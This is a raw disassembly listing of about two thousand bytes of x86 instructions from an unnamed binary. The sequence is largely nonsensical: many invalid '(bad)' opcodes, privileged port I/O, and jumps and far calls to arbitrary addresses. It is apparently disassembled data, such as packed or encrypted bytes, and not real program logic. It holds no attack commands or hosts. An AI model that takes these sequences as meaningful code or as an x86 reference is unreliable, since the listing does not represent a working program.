  416140:	(bad)  
  416141:	cmp    al,0xf3
  416143:	mov    ebp,0x9411f94
  416148:	inc    edi
  416149:	mov    ss:0x605d60cd,eax
  41614f:	push   ebx
  416150:	in     eax,dx
  416151:	add    al,BYTE PTR [edx+0x1d56eaa0]
  416157:	icebp  
  416158:	call   0x8f38503d
  41615d:	add    al,BYTE PTR [eax+0xe49ec13]
  416163:	cmc    
  416164:	lds    ecx,FWORD PTR [eax-0x43]
  416167:	pop    edi
  416168:	push   edx
  416169:	push   eax
  41616a:	addr16 test al,0xe
  41616d:	inc    ebx
  41616e:	mov    ch,0x56
  416170:	ret    
  416171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416172:	leave  
  416173:	popa   
  416174:	mov    bh,0xa3
  416176:	sub    bh,bl
  416178:	xchg   DWORD PTR [ebp-0x5bb47c8f],eax
  41617e:	ins    BYTE PTR es:[edi],dx
  41617f:	das    
  416180:	dec    ebp
  416181:	mov    edx,0xa7212643
  416186:	test   BYTE PTR [ecx],dh
  416188:	cs std 
  41618a:	or     dh,BYTE PTR [ebx+0x182829ce]
  416190:	dec    ebx
  416191:	sub    BYTE PTR [esi],0xe2
  416194:	stc    
  416195:	loop   0x4161a8
  416197:	add    esp,DWORD PTR [ebp+ebp*1+0x7cb1673c]
  41619e:	mov    edi,0xa5ea143f
  4161a3:	push   ecx
  4161a4:	fstp   QWORD PTR [ebx]
  4161a6:	push   esp
  4161a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161a8:	mov    dl,0x4a
  4161aa:	call   0xea3c2cc0
  4161af:	adc    BYTE PTR [ecx+ecx*1-0x1355f6d6],0x55
  4161b7:	inc    ebx
  4161b8:	ret    0xef0b
  4161bb:	out    0x8e,al
  4161bd:	mov    dl,0xd0
  4161bf:	(bad)  
  4161c0:	out    dx,eax
  4161c1:	dec    eax
  4161c2:	repz mov edi,0xbc75cf68
  4161c8:	or     eax,0x8ea5faa9
  4161cd:	adc    BYTE PTR [esi+0x1a40c385],bl
  4161d3:	xor    ebp,edx
  4161d5:	loopne 0x4161c5
  4161d7:	adc    esi,esp
  4161d9:	in     al,0x97
  4161db:	iret   
  4161dc:	imul   ecx,DWORD PTR [edx],0xffffff90
  4161df:	repz cmp eax,0xacf9b087
  4161e5:	xor    BYTE PTR [eax+edx*2],dl
  4161e8:	cmp    ebx,esp
  4161ea:	xor    ch,BYTE PTR [ebx]
  4161ec:	int3   
  4161ed:	(bad)  
  4161ee:	imul   edx,DWORD PTR [ecx],0x56
  4161f1:	mov    edx,0x7c50c765
  4161f6:	sti    
  4161f7:	push   ebp
  4161f8:	jae    0x4161da
  4161fa:	es xor al,0xf
  4161fd:	push   ebx
  4161fe:	inc    ebp
  4161ff:	jb     0x41621e
  416201:	dec    ebp
  416202:	movmskps esi,xmm1
  416205:	and    al,0x8f
  416207:	push   ecx
  416208:	cmp    dh,BYTE PTR [edx-0x2279c155]
  41620e:	les    esi,FWORD PTR [ebp+0x35f70835]
  416214:	push   0xffffffd1
  416216:	jmp    0x41625b
  416218:	adc    BYTE PTR [esi+0x522f59a4],bh
  41621e:	fild   WORD PTR [ebx]
  416220:	or     eax,0xcfdfd59d
  416225:	sbb    eax,0x5127d42
  41622a:	mov    ecx,0x1fb9c0f
  41622f:	add    al,0xa3
  416231:	in     al,dx
  416232:	mov    dh,0xa5
  416234:	ret    
  416235:	cmp    DWORD PTR [edi+edx*4+0x1ba53328],ebp
  41623c:	cli    
  41623d:	test   BYTE PTR [esi+0x5618e473],bl
  416243:	mov    es,eax
  416245:	push   0x56
  416247:	or     edx,esi
  416249:	and    DWORD PTR [ecx-0x56],ebx
  41624c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41624d:	add    ebx,edx
  41624f:	jmp    0x6aca:0xe96c0819
  416256:	scas   eax,DWORD PTR es:[edi]
  416257:	in     eax,0x1f
  416259:	or     eax,0xf5394b33
  41625e:	cli    
  41625f:	adc    DWORD PTR [edx+0x4a],eax
  416262:	int3   
  416263:	bswap  ebx
  416265:	mov    ebp,0x76b05bc7
  41626a:	adc    bh,BYTE PTR [esi]
  41626c:	jae    0x416206
  41626e:	sub    eax,0xedcc1f55
  416273:	rcr    edi,1
  416275:	jl     0x416224
  416277:	fistp  DWORD PTR [edi+edx*8+0x659d7585]
  41627e:	call   DWORD PTR [edx]
  416280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416281:	xlat   BYTE PTR ds:[ebx]
  416282:	inc    ebp
  416283:	fisttp WORD PTR [ecx-0x44]
  416286:	gs jmp 0xd8d094f2
  41628c:	sbb    eax,0x3959456b
  416291:	test   al,0xcb
  416293:	cmc    
  416294:	iret   
  416295:	cmp    ecx,DWORD PTR [edi+0x6098d650]
  41629b:	mov    DWORD PTR [edi+0x44ec3413],ebx
  4162a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162a2:	scas   al,BYTE PTR es:[edi]
  4162a3:	sbb    BYTE PTR [edx+0x296befe8],ch
  4162a9:	mov    eax,0xcb754814
  4162ae:	jb     0x416302
  4162b0:	les    ecx,FWORD PTR [ecx-0x75b16189]
  4162b6:	cmp    al,0xef
  4162b8:	stos   DWORD PTR es:[edi],eax
  4162b9:	std    
  4162ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162bb:	ins    BYTE PTR es:[edi],dx
  4162bc:	scas   eax,DWORD PTR es:[edi]
  4162bd:	int    0x7e
  4162bf:	and    edx,0xffffffd8
  4162c2:	lods   eax,DWORD PTR ds:[esi]
  4162c3:	mov    WORD PTR [eax-0x3d9570d1],?
  4162c9:	dec    edx
  4162ca:	div    BYTE PTR [edi]
  4162cc:	mov    bl,BYTE PTR [ebx-0x6d]
  4162cf:	jge    0x41628c
  4162d1:	jl     0x416278
  4162d3:	fmul   DWORD PTR [ebx]
  4162d5:	cmp    dh,ah
  4162d7:	in     al,dx
  4162d8:	ret    
  4162d9:	xor    esi,ebx
  4162db:	imul   BYTE PTR [edi-0x41cb252b]
  4162e1:	pop    ecx
  4162e2:	push   cs
  4162e3:	sub    al,0xd1
  4162e5:	bound  edi,QWORD PTR [edx]
  4162e7:	loopne 0x4162a2
  4162e9:	mov    ebp,0xcc9a614f
  4162ee:	sbb    eax,0x4338b11a
  4162f3:	mov    bl,0xb5
  4162f5:	hlt    
  4162f6:	inc    edi
  4162f7:	push   0x832af86c
  4162fc:	fs cmp dh,cl
  4162ff:	(bad)  
  416300:	loopne 0x416381
  416302:	je     0x416284
  416304:	mov    al,ds:0x4aa001e8
  416309:	fidivr DWORD PTR [ebp-0x2e]
  41630c:	out    0xe,al
  41630e:	or     al,0x7e
  416310:	dec    esi
  416311:	sbb    DWORD PTR [edx+0x21c90b79],edx
  416317:	inc    eax
  416318:	cmp    ah,BYTE PTR [esp+esi*1]
  41631b:	outs   dx,BYTE PTR ds:[esi]
  41631c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41631d:	push   ds
  41631e:	(bad)  
  41631f:	jmp    0x416331
  416321:	adc    BYTE PTR [edx],ah
  416323:	lea    ecx,[edi]
  416325:	mov    ebx,0x44fc5aef
  41632a:	mov    cl,0xcd
  41632c:	xchg   ecx,eax
  41632d:	mov    DWORD PTR [edi-0x74],esp
  416330:	test   esi,0xd75b6e3f
  416336:	in     al,0xfc
  416338:	mov    al,ds:0xf021a35f
  41633d:	mov    cl,0xde
  41633f:	adc    al,0x1a
  416341:	push   esp
  416342:	push   ecx
  416343:	push   esp
  416344:	das    
  416345:	pop    edx
  416346:	sub    BYTE PTR [edi-0x32],ah
  416349:	jg     0x41631e
  41634b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41634d:	dec    esi
  41634e:	push   0x79b5c634
  416353:	cmp    bl,BYTE PTR es:[edx]
  416356:	xchg   edi,eax
  416357:	ins    DWORD PTR es:[edi],dx
  416358:	sbb    eax,0xbcb808e7
  41635d:	inc    esi
  41635e:	and    ecx,DWORD PTR ds:0x4e1366cf
  416364:	jmp    FWORD PTR [edi-0x70]
  416367:	fild   WORD PTR [esi+ebx*4]
  41636a:	inc    edi
  41636b:	mov    edi,0xb0bd190f
  416370:	lock cmp eax,0x41decb4f
  416376:	cmp    al,0xdd
  416378:	inc    esp
  416379:	xchg   edx,esi
  41637b:	mov    WORD PTR es:[edi-0x4f],ss
  41637f:	call   0xbfe9be77
  416384:	repnz (bad) 
  416387:	iret   
  416388:	lods   al,BYTE PTR ds:[esi]
  416389:	and    eax,0xd0c3d248
  41638e:	jne    0x416375
  416390:	ficomp DWORD PTR [ebp-0x132c577f]
  416396:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416397:	das    
  416398:	cmp    BYTE PTR cs:[edx+esi*2-0x46],bh
  41639d:	xor    DWORD PTR [edi+ebx*8],0xfda3cfc3
  4163a4:	mov    edi,DWORD PTR [edi-0x7d]
  4163a7:	and    cl,BYTE PTR [edi+0x3b]
  4163aa:	(bad)  
  4163ab:	jae    0x41639d
  4163ad:	dec    ebx
  4163ae:	mov    edx,0x89306a6d
  4163b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163b4:	sub    BYTE PTR [esp+edi*4],al
  4163b7:	ins    DWORD PTR es:[edi],dx
  4163b8:	and    DWORD PTR [esi+ebp*8+0x28],esp
  4163bc:	ds ss sbb al,0xf3
  4163c0:	sbb    BYTE PTR [ebx+eiz*2-0x325978c3],dl
  4163c7:	pop    edx
  4163c8:	and    esi,edx
  4163ca:	stc    
  4163cb:	bound  eax,QWORD PTR [ebx-0x38]
  4163ce:	cmp    DWORD PTR [esi+ecx*4-0xe],esp
  4163d2:	add    DWORD PTR [esi-0x6b],edx
  4163d5:	or     DWORD PTR [ebx-0x7cb843d7],ebp
  4163db:	jnp    0x4163d9
  4163dd:	mov    ds:0xa9bfe777,eax
  4163e2:	repnz test eax,0x3f6950f7
  4163e8:	cdq    
  4163e9:	xchg   DWORD PTR [edx+0x2f31bfbe],esp
  4163ef:	push   0x6e5d6e02
  4163f4:	xor    eax,DWORD PTR [ebp-0x1d]
  4163f7:	icebp  
  4163f8:	outs   dx,BYTE PTR ds:[esi]
  4163f9:	jmp    0x7a2db4c9
  4163fe:	dec    ebx
  4163ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416400:	add    edx,edx
  416402:	fwait
  416403:	in     al,0x6f
  416405:	lods   eax,DWORD PTR ds:[esi]
  416406:	lahf   
  416407:	rol    BYTE PTR [edi-0x8],0xa6
  41640b:	imul   ebx,DWORD PTR [eax-0x1dba3865],0x6a3aea00
  416415:	or     edx,ebp
  416417:	call   0x5359:0x4d514c47
  41641e:	mov    esp,0x3a2b29d4
  416423:	adc    eax,0xbfbbca02
  416428:	sub    al,0xd2
  41642a:	mov    DWORD PTR [esi],eax
  41642c:	or     DWORD PTR [eax-0x7f],edx
  41642f:	aas    
  416430:	enter  0xcd75,0x46
  416434:	and    al,0x32
  416436:	fnstsw WORD PTR [edx]
  416438:	and    edi,DWORD PTR [esi+0x45]
  41643b:	dec    ebx
  41643c:	fcomp  QWORD PTR [edi+0x2f]
  41643f:	shl    eax,0xdd
  416442:	fwait
  416443:	in     al,dx
  416444:	fsub   DWORD PTR [edx]
  416446:	jp     0x4164be
  416448:	in     al,dx
  416449:	inc    edx
  41644a:	sahf   
  41644b:	xchg   ebx,eax
  41644c:	das    
  41644d:	and    BYTE PTR [esi+0x1c],ch
  416450:	pop    ebx
  416451:	mov    ss,ebp
  416453:	adc    eax,0xc86c62b2
  416458:	adc    eax,0x9aa06ab3
  41645d:	dec    esi
  41645e:	jge    0x41643b
  416460:	rol    BYTE PTR [bx+si-0x2e],1
  416464:	iret   
  416465:	out    0x6,al
  416467:	mov    al,0x52
  416469:	cmp    eax,0x7b21a5b9
  41646e:	mov    edx,0x2fc74b7b
  416473:	cli    
  416474:	jo     0x416465
  416476:	outs   dx,DWORD PTR ds:[esi]
  416477:	mul    bh
  416479:	mov    dl,0x40
  41647b:	mov    edi,DWORD PTR [edx+0x41f89f7a]
  416481:	call   0xf61:0x35ff806e
  416488:	sbb    eax,0x1e5258dc
  41648d:	or     al,0x5c
  41648f:	aam    0x27
  416491:	xor    DWORD PTR [ebp+eax*8+0x2e],esi
  416495:	pop    eax
  416496:	xor    eax,0x5d
	...
  416513:	add    BYTE PTR ds:0xfe3de0ab,dl
  416519:	jg     0x4164f8
  41651b:	stos   DWORD PTR es:[edi],eax
  41651c:	mov    esi,DWORD PTR [edi-0x1a302fe5]
  416522:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416523:	add    esi,DWORD PTR [ebp+0x9]
  416526:	add    DWORD PTR [eax],eax
  416528:	ins    BYTE PTR es:[edi],dx
  416529:	pop    es
  41652a:	add    BYTE PTR [eax],al
  41652c:	or     eax,0x37c855bd
  416531:	sbb    al,0xb1
  416533:	mov    ebx,0x2c326b07
  416538:	rcl    DWORD PTR [ebx-0x36c300c4],1
  41653e:	and    esp,DWORD PTR [ebx+0x66d9f329]
  416544:	lods   eax,DWORD PTR ds:[esi]
  416545:	leave  
  416546:	push   eax
  416547:	enter  0x79fe,0x43
  41654b:	sub    cl,al
  41654d:	scas   eax,DWORD PTR es:[edi]
  41654e:	mov    esp,0x2c33f12a
  416553:	imul   ebx,DWORD PTR [ebp+0x5e],0xffffffd8
  416557:	cmp    dh,BYTE PTR [ecx]
  416559:	shr    BYTE PTR [esi],cl
  41655b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41655c:	xor    DWORD PTR [esi-0x56106db0],ebp
  416562:	rol    dl,0xbf
  416565:	jno    0x4165c3
  416567:	sub    eax,0x1bd8ee9
  41656c:	in     al,dx
  41656d:	test   al,0xed
  41656f:	stc    
  416570:	stc    
  416571:	icebp  
  416572:	(bad)  
  416573:	iret   
  416574:	mov    ebx,0xdc47c045
  416579:	lods   al,BYTE PTR ds:[esi]
  41657a:	(bad)  
  41657b:	mov    ?,ebp
  41657d:	pop    ss
  41657e:	mov    edx,0x6a87415f
  416583:	setno  BYTE PTR [ebx+0x582fe33a]
  41658a:	clc    
  41658b:	add    edi,DWORD PTR [ebx]
  41658d:	test   al,0xbd
  41658f:	pop    ss
  416590:	inc    ebx
  416591:	retf   
  416592:	dec    ecx
  416593:	xchg   ecx,eax
  416594:	shl    BYTE PTR [edi+ecx*8-0x7c],cl
  416598:	sub    dh,BYTE PTR [eax]
  41659a:	mov    ds:0x7889a113,eax
  41659f:	hlt    
  4165a0:	dec    ebx
  4165a1:	or     DWORD PTR [edi+edx*1+0xea4cd36],eax
  4165a8:	sar    DWORD PTR ss:[ecx-0x65],1
  4165ac:	(bad)  
  4165ad:	hlt    
  4165ae:	aas    
  4165af:	gs mov dh,0x9b
  4165b2:	push   ecx
  4165b3:	mov    ebx,DWORD PTR [ebp+0x17]
  4165b6:	sar    DWORD PTR [esi-0x6756e3d3],cl
  4165bc:	cmp    BYTE PTR [ebp+0x70],bh
  4165bf:	fisub  DWORD PTR [edi+0x6c]
  4165c2:	retf   
  4165c3:	std    
  4165c4:	mov    eax,0x3a3cfff2
  4165c9:	pop    eax
  4165ca:	mov    eax,0xc70c6f14
  4165cf:	aam    0xa2
  4165d1:	sub    al,BYTE PTR [ebx]
  4165d3:	lahf   
  4165d4:	push   ecx
  4165d5:	pop    ebp
  4165d6:	lods   al,BYTE PTR ds:[esi]
  4165d7:	sbb    al,0x58
  4165d9:	jnp    0x4165b0
  4165db:	add    dh,bl
  4165dd:	fwait
  4165de:	test   eax,0x9caab7f9
  4165e3:	ja     0x4165f4
  4165e5:	clc    
  4165e6:	in     al,0xfc
  4165e8:	cmp    BYTE PTR [esi+0x16],al
  4165eb:	rcl    eax,cl
  4165ed:	call   0x7b82:0xec721b04
  4165f4:	popa   
  4165f5:	cdq    
  4165f6:	ins    DWORD PTR es:[edi],dx
  4165f7:	or     ebp,edi
  4165f9:	sub    DWORD PTR [edx+0x3a15df45],eax
  4165ff:	dec    edi
  416600:	rcr    cl,cl
  416602:	adc    esp,DWORD PTR [eax-0x17]
  416605:	or     al,0x3c
  416607:	mov    al,0xa9
  416609:	mov    esp,0x7b11cefd
  41660e:	lahf   
  41660f:	xor    ah,cl
  416611:	xchg   DWORD PTR [ebx],edi
  416613:	mov    WORD PTR [edi-0x76ce7b4b],?
  416619:	lods   eax,DWORD PTR ds:[esi]
  41661a:	leave  
  41661b:	fimul  WORD PTR [ebx-0x6f]
  41661e:	das    
  41661f:	jp     0x4165ca
  416621:	ret    0x5639
  416624:	add    dh,BYTE PTR [ebx-0x5b2d28ef]
  41662a:	lods   eax,DWORD PTR ds:[esi]
  41662b:	test   al,0x3f
  41662d:	xlat   BYTE PTR ds:[ebx]
  41662e:	std    
  41662f:	dec    ecx
  416630:	cmp    eax,0x49bf47e3
  416635:	xor    edx,DWORD PTR [ecx+ecx*2+0x69454f09]
  41663c:	pop    ds
  41663d:	ss xchg edx,eax
  41663f:	popf   
  416640:	sub    eax,0x3fc01e72
  416645:	int    0x59
  416647:	ret    0xd1fd
  41664a:	mov    cl,0xab
  41664c:	sbb    esi,ebp
  41664e:	add    BYTE PTR [ebp+0x497e09d1],dh
  416654:	jmp    0x416657
  416656:	pop    ecx
  416657:	add    ah,dl
  416659:	mov    ecx,0x6bc2de7e
  41665e:	shr    edi,cl
  416660:	xor    al,0x5d
  416662:	lock push 0x86ede7e7
  416668:	retf   
  416669:	(bad)  [eax+0x6256ea3d]
  41666f:	into   
  416670:	popa   
  416671:	cwde   
  416672:	rcr    DWORD PTR [ebx],cl
  416674:	adc    al,0xcb
  416676:	mov    cl,0x64
  416678:	jns    0x416613
  41667a:	mov    eax,ds:0x8cde92fd
  41667f:	mov    dh,0x6f
  416681:	or     esi,esp
  416683:	or     al,0x25
  416685:	leave  
  416686:	rcr    WORD PTR fs:[esi+0x3c],0xdc
  41668c:	clc    
  41668d:	enter  0x1d,0x8a
  416691:	dec    eax
  416692:	dec    ecx
  416693:	fstp   DWORD PTR [esi]
  416695:	into   
  416696:	xchg   esp,eax
  416697:	and    DWORD PTR [ebx+esi*1+0x44d4849c],esi
  41669e:	mov    ecx,0xac6883ef
  4166a3:	jecxz  0x41664b
  4166a5:	in     al,0xb5
  4166a7:	retf   
  4166a8:	sub    BYTE PTR [ebx+0x24eb7266],0xa9
  4166af:	and    DWORD PTR [esp+ecx*2-0x5b49fbe1],ebx
  4166b6:	inc    ebp
  4166b7:	(bad)  
  4166b8:	out    dx,al
  4166b9:	(bad)  
  4166ba:	fisub  DWORD PTR ds:0xe7f10d9a
  4166c0:	scas   al,BYTE PTR es:[edi]
  4166c1:	mov    cl,0xf8
  4166c3:	aas    
  4166c4:	jge    0x41672a
  4166c6:	jmp    0xcd660a85
  4166cb:	retf   
  4166cc:	dec    esp
  4166cd:	push   esp
  4166ce:	adc    ah,al
  4166d0:	pop    edi
  4166d1:	(bad)  
  4166d2:	ror    DWORD PTR [eax-0x200157bf],1
  4166d8:	imul   ebx,eax,0xfffffff2
  4166db:	xchg   ebx,eax
  4166dc:	ja     0x416672
  4166de:	sub    bl,dl
  4166e0:	xor    DWORD PTR [eax],edx
  4166e2:	aam    0xb8
  4166e4:	xchg   DWORD PTR [esi],eax
  4166e6:	jbe    0x4166ae
  4166e8:	adc    BYTE PTR [esi],cl
  4166ea:	pop    eax
  4166eb:	dec    eax
  4166ec:	mov    esp,0xc64e4acf
  4166f1:	fwait
  4166f2:	pop    eax
  4166f3:	arpl   WORD PTR [edx],cx
  4166f5:	push   0x4b276b6
  4166fa:	add    al,0x83
  4166fc:	mov    bl,0xc1
  4166fe:	repz push esp
  416700:	(bad)  
  416701:	lods   eax,DWORD PTR ds:[esi]
  416702:	cmp    bh,BYTE PTR [ecx+0x796f831e]
  416708:	rcr    edi,0x7f
  41670b:	jmp    0x989e7bdf
  416710:	push   ds
  416711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416712:	(bad)  
  416713:	mov    bp,0xe8f2
  416717:	inc    edi
  416718:	xor    DWORD PTR [esi],eax
  41671a:	js     0x4166b9
  41671c:	xor    esp,esi
  41671e:	mov    bl,0xd2
  416720:	bound  edx,QWORD PTR [ecx+0x51]
  416723:	loope  0x4166d5
  416725:	inc    edx
  416726:	dec    esp
  416727:	jb     0x4167a5
  416729:	or     BYTE PTR [eax-0x25],al
  41672c:	push   cs
  41672d:	leave  
  41672e:	lds    esi,FWORD PTR [esp+ebx*1]
  416731:	(bad)  [edx+ebx*8]
  416734:	sub    ebp,esi
  416736:	push   edi
  416737:	push   ss
  416738:	das    
  416739:	push   ds
  41673a:	sbb    DWORD PTR [ecx+0x39],eax
  41673d:	das    
  41673e:	(bad)  
  41673f:	fwait
  416740:	and    esp,0x408c5b8f
  416746:	sti    
  416747:	and    al,0x2e
  416749:	or     eax,0xabb8444a
  41674e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41674f:	icebp  
  416750:	ins    BYTE PTR es:[edi],dx
  416751:	xor    DWORD PTR [edx+edx*8+0x6fd552e7],ebp
  416758:	ret    
  416759:	and    esp,DWORD PTR [ebx-0x2b]
  41675c:	add    DWORD PTR [eax],edx
  41675e:	into   
  41675f:	adc    ah,BYTE PTR [edx+ebx*1+0x77]
  416763:	mov    eax,0xa0138013
  416768:	test   DWORD PTR [edx+0x2e94e292],esi
  41676e:	jnp    0x416716
  416770:	add    al,0x66
  416772:	stc    
  416773:	adc    al,0xc5
  416775:	add    BYTE PTR [edi+0x5b],ah
  416778:	mov    eax,0x76b9b73
  41677d:	call   0xc1e9e1db
  416782:	stc    
  416783:	mov    bh,0xee
  416785:	mov    ecx,0x2bece8f0
  41678a:	push   ss
  41678b:	sbb    DWORD PTR [ebx],ebp
  41678d:	sar    eax,cl
  41678f:	cvtdq2ps xmm2,XMMWORD PTR ds:0x33f6c2a5
  416796:	dec    eax
  416797:	cdq    
  416798:	out    dx,eax
  416799:	or     ch,cl
  41679b:	mov    esp,0xb923a573
  4167a0:	fisttp WORD PTR [ecx-0x76]
  4167a3:	inc    eax
  4167a4:	and    al,BYTE PTR [esi+0x77]
  4167a7:	lock imul BYTE PTR [edi]
  4167aa:	ins    DWORD PTR es:[edi],dx
  4167ab:	loopne 0x41678a
  4167ad:	ss push esi
  4167af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167b0:	arpl   WORD PTR [ebx+0x6e],cx
  4167b3:	aaa    
  4167b4:	dec    ebp
  4167b5:	loop   0x4167a4
  4167b7:	pop    esi
  4167b8:	data16 cmc 
  4167ba:	loopne 0x416810
  4167bc:	pcmpeqw mm2,QWORD PTR [ebx]
  4167bf:	scas   eax,DWORD PTR es:[edi]
  4167c0:	sbb    eax,0xada21a5b
  4167c5:	jmp    0x8c3ffcd2
  4167ca:	adc    eax,0x93343706
  4167cf:	sub    BYTE PTR [ebx+0x1c4e8fd5],ch
  4167d5:	jno    0x416849
  4167d7:	inc    ebx
  4167d8:	push   ecx
  4167d9:	aaa    
  4167da:	mov    ch,0x3
  4167dc:	ins    BYTE PTR es:[edi],dx
  4167dd:	push   ds
  4167de:	or     ah,bl
  4167e0:	fwait
  4167e1:	aam    0xa
  4167e3:	pop    eax
  4167e4:	scas   eax,DWORD PTR es:[edi]
  4167e5:	dec    BYTE PTR [edi]
  4167e7:	loop   0x4167b0
  4167e9:	rcl    BYTE PTR [esi+0x15],cl
  4167ec:	(bad)  
  4167ed:	sti    
  4167ee:	mov    al,ds:0x99c32614
  4167f3:	ret    
  4167f4:	outs   dx,DWORD PTR ds:[esi]
  4167f5:	mov    ah,0x5b
  4167f7:	fbld   TBYTE PTR [esi]
  4167f9:	ds mov ebx,0x35723c79
  4167ff:	add    ah,BYTE PTR [eax-0x47ec7276]
  416805:	cmp    BYTE PTR [ebx+0x38],al
  416808:	arpl   WORD PTR [edx-0x254bf45f],bx
  41680e:	jbe    0x41686d
  416810:	pop    edx
  416811:	test   al,0x90
  416813:	jl     0x416813
  416815:	pushf  
  416816:	rol    DWORD PTR [esi-0x19],0x21
  41681a:	pop    esi
  41681b:	popf   
  41681c:	inc    edi
  41681d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41681e:	fild   QWORD PTR [ebp-0x51]
  416821:	(bad)  
  416823:	out    dx,eax
  416824:	mov    bh,0x96
  416826:	jg     0x4167ef
  416828:	push   es
  416829:	add    edx,DWORD PTR ds:0xe2f0a392
  41682f:	xor    cl,BYTE PTR [edi-0x4c]
  416832:	jno    0x416867
  416834:	xchg   esp,eax
  416835:	pop    ds
  416836:	xchg   edi,eax
  416837:	js     0x4167e6
  416839:	push   edi
  41683a:	jp     0x416869
  41683c:	add    bl,BYTE PTR [ecx-0x2e497fcb]
  416842:	xchg   ebp,eax
  416843:	pusha  
  416844:	xor    cl,BYTE PTR [ecx]
  416846:	mov    ecx,cs
  416848:	jae    0x4167da
  41684a:	jnp    0x4167ee
  41684c:	or     eax,0xa4039ea4
  416851:	mov    edx,0xab5f4a09
  416856:	lods   eax,DWORD PTR ds:[esi]
  416857:	inc    ecx
  416858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416859:	iret   
  41685a:	mov    ds:0xf9a074d8,al
  41685f:	or     al,0xfd
  416861:	jge    0x4168ba
  416863:	sbb    DWORD PTR [ebp-0x28],0x4
  416867:	sbb    DWORD PTR [edi-0x17],ecx
  41686a:	xchg   esp,eax
  41686b:	mov    ebx,0x4d0f605d
  416870:	cmp    al,0xed
  416872:	retf   0x3a5b
  416875:	repz (bad) 
  416877:	adc    al,0x35
  416879:	or     BYTE PTR [ebp+0x39],0x57
  41687d:	ror    BYTE PTR [ecx+eiz*8+0x73],cl
  416881:	or     cl,BYTE PTR [ecx+0x2f]
  416884:	in     al,dx
  416885:	jns    0x41680f
  416887:	or     eax,ecx
  416889:	fst    DWORD PTR [ecx]
  41688b:	push   0x13
  41688d:	push   0x470608bc
  416892:	mov    ds:0xf102247d,al
  416897:	and    eax,0x6cd55934
  41689c:	add    al,0x5e
  41689e:	rol    DWORD PTR [ebp+0x2733a03c],1
  4168a4:	add    DWORD PTR [ebp+0x21],ebp
  4168a7:	jmp    0xa074a37d
  4168ac:	jmp    0x416838
  4168ae:	push   edi
  4168af:	sar    DWORD PTR [ebp+0x3d],cl
  4168b2:	or     BYTE PTR [edi+0x72],0xdd
  4168b6:	out    dx,al
  4168b7:	mov    ebx,0x399a5f0e
  4168bc:	mov    BYTE PTR [eax+esi*1],al
  4168bf:	lods   eax,DWORD PTR ds:[esi]
  4168c0:	stos   DWORD PTR es:[edi],eax
  4168c1:	ffree  st(7)
  4168c3:	outs   dx,BYTE PTR ds:[esi]
  4168c4:	xor    eax,0x7c475384
  4168c9:	jo     0x416942
  4168cb:	in     al,dx
  4168cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168cd:	xor    DWORD PTR [eax-0x1c746290],esp
  4168d3:	push   ecx
  4168d4:	push   ebx
  4168d5:	add    dh,dh
  4168d7:	lods   eax,DWORD PTR ds:[si]
  4168d9:	push   ds
  4168da:	aad    0x83
  4168dc:	push   esp
  4168dd:	push   ebx
  4168de:	pop    ss
  4168df:	or     eax,0x9351ef8c
  4168e4:	jno    0x4168d6
  4168e6:	sbb    eax,0x5b9df81
  4168eb:	add    eax,0xea6ec362
  4168f0:	sahf   
  4168f1:	mov    ecx,?
  4168f3:	stc    
  4168f4:	mov    al,ds:0x95ed7ec1
  4168f9:	arpl   WORD PTR [esi],di
  4168fb:	xchg   edi,eax
  4168fc:	mov    DWORD PTR [ecx],esi
  4168fe:	sub    cl,BYTE PTR [ecx-0x41]
  416901:	pop    edx
  416902:	jge    0x416979
  416904:	popa   
  416905:	ss sbb eax,0x8ce5e9a
  41690b:	aam    0xd8
  41690d:	mov    eax,0x10e45295
  416912:	mov    BYTE PTR [ecx-0x24fbab],dl
  416918:	pop    es
  416919:	fnstsw WORD PTR [edi+0x33c79f94]
  41691f:	shl    BYTE PTR [ebp+0x71],0x2a
  416923:	push   eax
  416924:	fnstenv [ecx+0x62]
  416927:	int    0x52
  416929:	enter  0xd832,0x2b
  41692d:	xchg   DWORD PTR [edx],eax
  41692f:	stos   BYTE PTR es:[edi],al
  416930:	push   esp
  416931:	jle    0x416900
  416933:	mov    ch,0x71
  416935:	pop    ecx
  416936:	fld    QWORD PTR [esp+esi*1-0x1017f98d]
  41693d:	adc    DWORD PTR [ecx+0x55],0xfffffffd
  416941:	and    eax,0x319ee5a2
  416946:	mov    dh,0xb7
  416948:	fild   DWORD PTR [esp+ebx*4+0x47808d2c]
  41694f:	add    eax,0x8a73f60e
  416954:	mov    bh,0x6f
  416956:	push   esp
  416957:	sub    ah,BYTE PTR [esi+esi*8-0x6ae20ac]
  41695e:	out    dx,al
  41695f:	retf   0xd806
  416962:	push   ecx
  416963:	xchg   DWORD PTR [eax+0x2a0ebcd9],eax
  416969:	mov    ecx,0x844a7bce
  41696e:	retf   0xe0a1
  416971:	add    eax,0xbc544789
  416976:	add    DWORD PTR [edx+0x1],ecx
  416979:	xchg   ebx,eax
  41697a:	std    
  41697b:	cmp    al,0xba
  41697d:	cs or  cl,dl
  416980:	sub    edi,DWORD PTR [edi+0x1e]
  416983:	jecxz  0x416916
  416985:	sub    dh,BYTE PTR [ebp-0x42c28033]
  41698b:	aaa    
  41698c:	leave  
  41698d:	pop    edi
  41698e:	out    dx,eax
  41698f:	mov    esi,0x23af604a
  416994:	rcr    DWORD PTR [esi],1
  416996:	add    cl,BYTE PTR [ebp+eax*8+0x1f]
  41699a:	or     eax,0xbbd6c57c
  41699f:	push   edi
  4169a0:	sti    
  4169a1:	add    eax,0x1c0cda5a
